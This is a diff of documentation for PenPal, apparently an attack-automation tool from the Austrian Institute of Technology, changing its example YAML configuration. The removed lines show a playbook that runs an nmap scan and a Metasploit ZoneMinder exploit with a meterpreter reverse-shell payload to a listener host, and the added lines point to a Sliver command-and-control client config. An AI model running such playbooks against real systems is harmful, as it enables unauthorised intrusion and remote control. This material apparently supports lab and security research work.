@@ -21,15 +21,12 @@ PenPal ships with a executable stub called "penpal" that can be called like foll
 
    (Austrian Institute of Technology) https://aecid.ait.ac.at Version: 0.1.0
 
-The configuration-file is in yaml-format. The following yaml-file is an example of a playbook.yml:
+
+The configuration-file is in yaml-format:
 
 .. code-block:: yaml
 
    ###
-
-   vars:
-     $SERVER_ADDRESS: 192.42.0.254
-
    cmd_config:
      loop_sleep: 5
 
@@ -37,16 +34,5 @@ The configuration-file is in yaml-format. The following yaml-file is an example 
      password: hackhelfer
      server: 10.18.3.86
 
-   commands:
-     - type: shell
-       cmd: nmap $SERVER_ADDRESS
-       error_if: .*test.*
-
-     - type: msf-module
-       cmd: exploit/unix/webapp/zoneminder_snapshots
-       creates_session: "foothold"
-       options:
-         RHOSTS: 192.42.0.254
-       payload_options:
-         LHOST: 192.42.2.253
-       payload: cmd/unix/python/meterpreter/reverse_tcp
+   sliver_config:
+     config_file: /home/attacker/.sliver-client/configs/attacker_localhost.cfg
